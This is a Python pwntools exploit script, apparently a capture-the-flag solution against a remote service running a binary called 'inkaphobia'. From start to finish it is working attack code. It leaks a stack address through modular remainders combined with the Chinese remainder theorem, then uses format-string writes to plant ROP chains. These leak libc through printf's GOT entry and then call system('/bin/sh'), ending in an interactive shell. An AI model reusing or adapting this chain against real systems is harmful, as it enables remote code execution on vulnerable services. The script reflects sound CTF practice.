from pwn import *
from sympy.ntheory.modular import crt

context.arch = "amd64"

elf = ELF("./inkaphobia")
libc = ELF("./libc.so.6")
rop = ROP(elf)

#conn = elf.process()
conn = remote("143.244.152.111", 42008)

primes = [101, 103, 107, 109, 113, 127]

def get_remainder(num):
  conn.recvuntil(":")
  conn.sendline(str(num))
  conn.recvuntil(":")
  rem = int(conn.recvline().strip())
  log.info(f"addr ≡ {rem} (mod {num})")
  return rem

conn.recvline()
remainders = []
for prime in primes: # get stack address mod primes
  remainders.append(get_remainder(prime))

# solve for the address mod 101*103*107*109*113*127
res = crt(primes, remainders)

# find likely stack address
buf_addr = [res[0]+res[1]*n for n in range(1, 1000) if hex(res[0]+res[1]*n)[0:4]=="0x7f" and len(hex(res[0]+res[1]*n))==14][0]

log.info("Stack leak: " + hex(buf_addr))
conn.recvline()

# assemble our first ropchain
writes_l = [
  rop.find_gadget(["ret"])[0], # stack alignment
  rop.find_gadget(["pop rdi", "ret"])[0],
  elf.got["printf"],
  elf.symbols["printf"],
  rop.find_gadget(["ret"])[0], # stack alignment
  elf.symbols["main"],
]

writes = {}

# format it in a way that pwntools understands, also get the offsets right
for n, addr in enumerate(writes_l):
  writes[buf_addr+540+n*8] = addr

payload = fmtstr_payload(8, writes)

# send our payload and recieve our leaks
conn.sendline(payload)
printf = u64(conn.recvuntil("Welcome")[-13:-7] + b"\x00\x00")
log.info("printf(): " + hex(printf))
libc.address = printf - libc.symbols["printf"]
log.info("libc base: " + hex(libc.address))

# do it all over again
remainders = []
for prime in primes:
  remainders.append(get_remainder(prime))

res = crt(primes, remainders)

buf2_addr = [res[0]+res[1]*n for n in range(1, 1000) if hex(res[0]+res[1]*n)[0:4]=="0x7f" and len(hex(res[0]+res[1]*n))==14][0]
log.info("Second stack leak: " + hex(buf2_addr))
conn.recvline()

# system("/bin/sh")
writes_l = [
  rop.find_gadget(["ret"])[0], # stack alignment
  rop.find_gadget(["pop rdi", "ret"])[0],
  next(libc.search(b"/bin/sh")),
  libc.symbols["system"]
]

writes = {}

for n, addr in enumerate(writes_l):
  writes[buf2_addr+540+n*8] = addr

print(len(payload))
payload = fmtstr_payload(8, writes)
conn.sendline(payload)

# clean up output
conn.sendline("echo end")
conn.recvuntil("end\n")

conn.interactive()
